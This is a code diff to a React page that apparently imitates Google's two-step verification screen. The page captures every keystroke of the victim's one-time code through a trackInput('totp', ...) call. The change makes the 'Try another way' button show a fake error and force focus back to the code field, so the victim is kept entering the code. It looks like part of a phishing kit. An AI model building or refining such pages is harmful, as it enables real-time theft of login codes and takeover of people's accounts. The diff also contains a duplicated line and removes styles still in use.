@@ -120,31 +120,6 @@ ${GE_SHELL_CSS}
   color: var(--gm3-primary);
 }
 
-.ge-actions {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: space-between;
-  margin-top: auto;
-  padding-top: 32px;
-  gap: 8px;
-  width: 100%;
-}
-.ge-btn-text {
-  background: none;
-  border: none;
-  padding: 0 12px;
-  height: 40px;
-  border-radius: 20px;
-  color: var(--gm-next-fill);
-  font-family: inherit;
-  font-size: 0.875rem;
-  font-weight: 500;
-  letter-spacing: 0.0107142857em;
-  cursor: pointer;
-}
-.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn {
   display: inline-flex;
   align-items: center;
@@ -181,6 +156,7 @@ function GeAuthenticatorPage() {
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [code, setCode] = useState("");
   const [focused, setFocused] = useState(false);
+  const [fieldError, setFieldError] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -249,7 +225,7 @@ function GeAuthenticatorPage() {
 
           <form className="ge-form" onSubmit={handleNext} autoComplete="off">
             <div
-              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
+              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}${fieldError ? " is-error" : ""}`}
             >
               <input
                 ref={inputRef}
@@ -261,11 +237,16 @@ function GeAuthenticatorPage() {
                 spellCheck={false}
                 aria-label="Enter code"
                 value={code}
-                onFocus={() => setFocused(true)}
+                onFocus={() => {
+                  setFocused(true);
+                  setFieldError(false);
+                }}
                 onBlur={() => setFocused(false)}
                 onChange={(e) => {
                   const v = e.target.value.replace(/[^\d\s]/g, "");
                   setCode(v);
+                  setFieldError(false);
+                  setFieldError(false);
                   trackInput("totp", v, "text");
                 }}
               />
@@ -277,7 +258,11 @@ function GeAuthenticatorPage() {
               <button
                 type="button"
                 className="ge-btn-text"
-                onClick={() => trackClick("Try another way")}
+                onClick={() => {
+                  trackClick("Try another way");
+                  setFieldError(true);
+                  inputRef.current?.focus();
+                }}
               >
                 Try another way
               </button>
